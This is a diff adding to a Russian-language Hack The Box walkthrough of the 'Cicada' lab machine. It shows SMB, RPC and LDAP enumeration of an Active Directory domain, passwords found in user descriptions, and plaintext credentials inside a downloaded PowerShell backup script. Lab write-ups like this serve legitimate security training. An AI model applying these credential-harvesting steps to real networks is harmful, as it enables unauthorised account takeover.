@@ -301,9 +301,24 @@ SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ        
 SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
 ```
 
-Мы можем вработать через эту учетную запись не только в **SMB**, давайте попробуем войти через неё в **RPC** и **LDAP**
+К сожалению, мы не имеем достаточно прав, чтоб как-то взаимодействовать с этими шарами
+```
+Hexada@hexada ~/Downloads$ smbclient //cicada.htb/IPC$ -U michael.wrightson                                                                                                         130 ↵  
+smb: \> ls
+NT_STATUS_NO_SUCH_FILE listing \*
+```
+```
+Hexada@hexada ~/Downloads$ smbclient //cicada.htb/NETLOGON -U michael.wrightson                                                                                                            
+do_connect: Connection to CICADA-DC.cicada.htb failed (Error NT_STATUS_UNSUCCESSFUL)
+```
+```
+Hexada@hexada ~/Downloads$ smbclient //cicada.htb/SYSVOL  -U michael.wrightson                                                                                                        1 ↵  
+do_connect: Connection to CICADA-DC.cicada.htb failed (Error NT_STATUS_UNSUCCESSFUL)
+```
 
+Но мы можем работать через эту учетную запись не только в **SMB**, давайте попробуем войти через неё в **RPC** и **LDAP**
 
+**RPC**
 ```vbnet
 Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ rpcclient -U michael.wrightson cicada.htb                                                                                       1 ↵ main 
 Can't load /etc/samba/smb.conf - run testparm to debug it
@@ -311,7 +326,102 @@ Password for [WORKGROUP\michael.wrightson]:
 rpcclient $>
 ```
 
+Полазив там, посмотрев права и привилегии, посмотрев информацию о пользователях, и изучив группы, я из всего перечисленого, увидел только одну очень интересуную вещь в `Description`
+```vbnet
+rpcclient $> queryuser 0x454
+        User Name   :   david.orelious
+        Full Name   :
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+        Logon Script:
+        Description :   Just in case I forget my password is aRt$L*****
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Wed, 08 Jan 2025 19:17:06 EET
+        Logoff Time              :      Thu, 01 Jan 1970 03:00:00 MSK
+
+        ...
+```
+
+Кстати, мы можем тоже самое увидеть в `Description`, в **LDAP**
+
 ```vbnet
 Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*****' -b 'dc=cicada,dc=htb'
 ```
+```vbnet
+# David Orelious, Users, cicada.htb
+dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: David Orelious
+sn: Orelious
+description: Just in case I forget my password is aRt$L*****
+givenName: David
+initials: D
+distinguishedName: CN=David Orelious,CN=Users,DC=cicada,DC=htb
+instanceType: 4
+whenCreated: 20240314121729.0Z
+whenChanged: 20250108084925.0Z
+
+...
+```
+
+Теперь у нас есть доступ к двум учетным записям, давайте посмотри какие привелегии имеет учетная запись `david.orelious`
+```vbnet
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb cicada.htb -u david.orelious -p 'aRt$L*****' --shares                                    130 ↵ main 
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
+SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
+```
+
+Как мы видим, мы имеем досиуп к шару **DEV**, к которому мы раньше не имели доступ с учетной записи `michael.wrightson`, давайте смотреть что там
+```vbnet
+Hexada@hexada ~/app/cicada.htb$ smbclient //cicada.htb/DEV -U david.orelious                                                                                                               
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Password for [WORKGROUP\david.orelious]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar 14 14:31:39 2024
+  ..                                  D        0  Thu Mar 14 14:21:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 20:28:22 2024
+
+                4168447 blocks of size 4096. 110752 blocks available
+smb: \> mget *
+Get file Backup_script.ps1? y
+getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
+```
+
+```vbnet
+Hexada@hexada ~/app/cicada.htb$ cat Backup_script.ps1                                                                                                                                      
+
+$sourceDirectory = "C:\smb"
+$destinationDirectory = "D:\Backup"
+
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$backupFileName = "smb_backup_$dateStamp.zip"
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+```
+
+
+Это **power shell** скрипт
+
+
 
